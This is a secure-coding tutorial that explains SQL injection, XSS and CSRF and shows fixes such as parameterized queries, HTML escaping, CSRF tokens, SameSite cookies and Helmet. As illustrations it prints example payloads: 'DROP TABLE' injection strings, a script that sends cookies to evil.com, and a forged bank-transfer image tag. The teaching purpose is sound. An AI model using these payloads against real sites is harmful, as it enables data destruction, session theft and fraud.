## Why it exists (THE PROBLEM)

Three of the most common web vulnerabilities: SQL injection, XSS, CSRF. Each can be eliminated with a few specific patterns — but most codebases still get them wrong.

**SQL Injection** — the most dangerous. Attacker submits `'; DROP TABLE users; --` as a username. Server concatenates: `SELECT * FROM users WHERE name = ''; DROP TABLE users; --'`. Database executes BOTH statements. Users table deleted. All data lost.

**XSS (Cross-Site Scripting)** — attacker injects `<script>document.location='evil.com?c='+document.cookie</script>` into a comment field. When other users view the comment, their cookies (with their session tokens) are sent to the attacker. The attacker logs in as them.

**CSRF (Cross-Site Request Forgery)** — attacker tricks user's browser into making a request. You visit evil.com, which has `<img src="bank.com/transfer?to=attacker&amount=1000">`. Your bank session cookie is sent automatically. Money transferred.

## The fix patterns

### 1. SQL Injection — Use parameterized queries, ALWAYS

```javascript
// BAD: string concatenation
db.query(`SELECT * FROM users WHERE name = '${req.body.name}'`)
// Attacker sends: ' OR 1=1; DROP TABLE users; --
// Query becomes: SELECT * FROM users WHERE name = '' OR 1=1; DROP TABLE users; --'

// GOOD: parameterized query
db.query('SELECT * FROM users WHERE name = ?', [req.body.name])
// OR with an ORM: db.users.findOne({ name: req.body.name })
```

NEVER concatenate user input into a SQL string. Use `?` placeholders. Every database library supports this. Use it.

### 2. XSS — Escape output, sanitize input

```javascript
// BAD: rendering user input as HTML
res.send(`<h1>Hello, ${user.name}</h1>`)  // If name is <script>alert(1)</script>, it runs

// GOOD: escape when rendering
// In React/Vue/Angular: auto-escaped by default. Just use {user.name}, not innerHTML
// In raw HTML:
res.send(`<h1>Hello, ${escapeHtml(user.name)}</h1>`)
function escapeHtml(s) { return s.replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;').replace(/"/g, '&quot;'); }
```

Frameworks (React, Vue) auto-escape. Use them. Don't use `innerHTML` or `dangerouslySetInnerHTML` with user data.

### 3. CSRF — Token on every state-changing request

```javascript
// Server generates a unique token per session
app.use(csrf({ cookie: true })) // express-csrf or similar
app.get('/transfer', (req, res) => res.json({ csrfToken: req.csrfToken() }))

// Form sends the token back
<form action="/transfer" method="POST">
  <input name="_csrf" value="<%= csrfToken %>">
  ...
</form>

// Server verifies
app.post('/transfer', csrf({ cookie: true }), (req, res) => {
  // csrf middleware already verified req.body._csrf
  // ... perform transfer
})
```

Or use SameSite cookies (modern fix): `Set-Cookie: session=xyz; SameSite=Strict`. The browser won't send the cookie on cross-site requests. CSRF becomes impossible. **Use SameSite=Strict as the primary defense.**

## The security headers (Helmet)

```javascript
const helmet = require('helmet');
app.use(helmet());
// Sets 15+ security headers automatically:
// Content-Security-Policy: only load resources from your domain
// X-Content-Type-Options: nosniff (don't MIME-sniff)
// X-Frame-Options: DENY (no iframe embedding)
// Strict-Transport-Security: HTTPS only
// X-XSS-Protection: 0 (modern browsers don't need this; CSP is better)
```

Just add `helmet()` to your app. 5 characters. 15+ security headers.

## Connection to our projects

Every API we built in apps/ is vulnerable to SQL injection if the user is searching for an apostrophe. Add parameterized queries. Every HTML-rendering server is vulnerable to XSS. Add escapeHtml. Every state-changing endpoint needs CSRF protection. Add `SameSite=Strict` cookies as the baseline.

The OWASP Top 10 (https://owasp.org/www-project-top-ten/) lists the top 10 web vulnerabilities. Memorize the top 5. Most are easy fixes.
